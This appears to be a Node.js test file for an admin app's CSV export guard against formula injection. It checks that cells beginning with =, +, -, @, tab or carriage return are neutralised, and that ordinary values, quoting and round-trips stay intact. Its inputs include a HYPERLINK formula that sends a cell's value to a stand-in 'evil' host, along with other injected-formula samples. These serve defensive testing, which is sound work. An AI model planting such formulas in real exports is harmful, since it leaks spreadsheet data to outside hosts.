import assert from 'node:assert/strict'
import test from 'node:test'
import { neutraliseFormula, parseCsv, toCsv } from '../../apps/admin/src/lib/csv.ts'

for (const value of [
  '=HYPERLINK("https://evil/?"&A1,"x")',
  '+SUM(1,1)',
  '-1+1',
  '@SUM(A1)',
  '\t=1+1',
  '\r=1+1',
]) {
  test(`CSV export formula neutralisation (BS-09) guards a cell that starts a formula: ${JSON.stringify(value)}`, () => {
    assert.equal(neutraliseFormula(value), `'${value}`)
    // The guard sits OUTSIDE any quoting, so the cell still begins with it.
    assert.equal(toCsv([[value]]).replace(/^"/, '').startsWith("'"), true)
  })
}

test('CSV export leaves ordinary text, empty cells and mid-string symbols alone', () => {
  assert.equal(toCsv([['Grade 4 Maths', '', 'a=b', 'x-y', 'me@example.com']]), 'Grade 4 Maths,,a=b,x-y,me@example.com')
})

test('CSV export keeps plain numbers numeric, including negatives', () => {
  assert.equal(toCsv([['-12.50', '0', '299.00']]), '-12.50,0,299.00')
})

test('CSV export still quotes cells with commas, quotes or newlines after guarding', () => {
  assert.equal(toCsv([['=A1,B1']]), `"'=A1,B1"`)
})

test('CSV export round-trips an exported file unchanged', () => {
  const rows = [['name', 'message'], ['=cmd', 'line one\nline two'], ['-5', '@x']]
  assert.deepEqual(parseCsv(toCsv(rows)), rows)
})
